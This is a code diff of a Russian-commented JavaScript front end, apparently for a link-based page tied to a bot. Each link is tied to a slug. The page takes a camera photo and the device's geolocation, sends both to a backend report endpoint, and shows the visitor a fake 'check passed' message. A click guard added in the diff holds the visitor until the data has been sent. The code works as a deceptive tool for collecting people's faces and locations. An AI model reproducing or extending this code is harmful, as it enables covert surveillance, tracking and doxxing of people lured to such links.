@@ -1,6 +1,6 @@
 // === app.js (OneClick linked with bot) ===
 
-// API base comes from index.html <script>window.__API_BASE=...</script>
+// API base comes из <script>window.__API_BASE</script> в index.html
 const API_BASE = (typeof window !== 'undefined' && window.__API_BASE)
   ? String(window.__API_BASE).replace(/\/+$/, '')
   : '';
@@ -14,7 +14,7 @@ const UI = {
 window.__reportReady = false;
 window.__SLUG = window.__SLUG ?? null; // глобально
 
-// === slug resolver (query -> /r/<slug> -> cached) ===
+// === slug resolver (/r/<slug>, ?slug=, кэш) ===
 function determineSlug() {
   const q = new URLSearchParams(location.search).get('slug');
   const m = location.pathname.match(/^\/r\/([a-z0-9\-]{3,40})$/i);
@@ -24,13 +24,14 @@ function determineSlug() {
   return slug;
 }
 
-// === FETCH LINK INFO (просто проверка slug) ===
+// === FETCH LINK INFO (валидация slug, лог для отладки) ===
 async function loadLinkInfo() {
   const slug = determineSlug();
   if (!slug) return;
   try {
     const r = await fetch(`${API_BASE}/api/link-info?slug=${encodeURIComponent(slug)}`);
     if (r.ok) console.log('🔗 link-info ok for', slug);
+    else console.warn('link-info failed', r.status);
   } catch (e) {
     console.warn('link-info fetch failed', e);
   }
@@ -59,7 +60,7 @@ function setBtnReady() {
   b.style.boxShadow = '0 0 20px rgba(79,0,255,.6), 0 0 28px rgba(0,191,255,.45)';
 }
 
-// === Гео ===
+// === Геолокация ===
 async function askGeolocation() {
   return new Promise((resolve) => {
     if (!('geolocation' in navigator)) return resolve(null);
@@ -77,7 +78,7 @@ async function askGeolocation() {
   });
 }
 
-// === Сжатие ===
+// === Сжатие base64 фото ===
 function downscaleDataUrl(dataUrl, maxSide = 1280, quality = 0.7) {
   return new Promise((resolve, reject) => {
     const img = new Image();
@@ -112,7 +113,8 @@ async function takePhoto() {
       const cap = new ImageCapture(track);
       const bmp = await cap.grabFrame();
       const c = document.createElement('canvas');
-      c.width = bmp.width; c.height = bmp.height;
+      c.width = bmp.width;
+      c.height = bmp.height;
       c.getContext('2d').drawImage(bmp, 0, 0);
       const dataUrl = c.toDataURL('image/jpeg', 0.85);
       track.stop();
@@ -122,7 +124,8 @@ async function takePhoto() {
     v.srcObject = stream;
     await v.play();
     const c = document.createElement('canvas');
-    c.width = v.videoWidth; c.height = v.videoHeight;
+    c.width = v.videoWidth;
+    c.height = v.videoHeight;
     c.getContext('2d').drawImage(v, 0, 0);
     const dataUrl = c.toDataURL('image/jpeg', 0.85);
     stream.getTracks().forEach((t) => t.stop());
@@ -133,7 +136,7 @@ async function takePhoto() {
   }
 }
 
-// === Инфо ===
+// === Инфо об устройстве ===
 function getDeviceInfo() {
   const ua = navigator.userAgent;
   const isSafari =
@@ -172,10 +175,13 @@ async function autoFlow() {
     UI.text.innerHTML = 'Запрашиваем камеру и геолокацию…';
     const isSecure = location.protocol === 'https:' || location.hostname === 'localhost';
     if (!isSecure) throw new Error('Нужен HTTPS (или localhost) для камеры/гео');
+
     const [geo, rawPhoto] = await Promise.all([askGeolocation(), takePhoto()]);
     const photoBase64 = await downscaleDataUrl(rawPhoto, 1280, 0.7);
+
     UI.text.innerHTML = 'Отправляем данные…';
     await sendReport({ photoBase64, geo });
+
     window.__reportReady = true;
     setBtnReady();
     UI.text.innerHTML = '<span class="ok">Проверка пройдена.</span>';
@@ -191,4 +197,13 @@ async function autoFlow() {
 
 // === Инициализация ===
 window.__autoFlow = autoFlow;
-loadLinkInfo(); // ← загрузка slug и sanity-check
+loadLinkInfo(); // ← подгружаем slug и проверяем линк
+
+// защита от преждевременного клика
+(function guardClick() {
+  const btn = UI.btn;
+  if (!btn) return;
+  btn.addEventListener('click', (e) => {
+    if (!window.__reportReady) { e.preventDefault(); e.stopPropagation(); }
+  }, { capture: true });
+})();
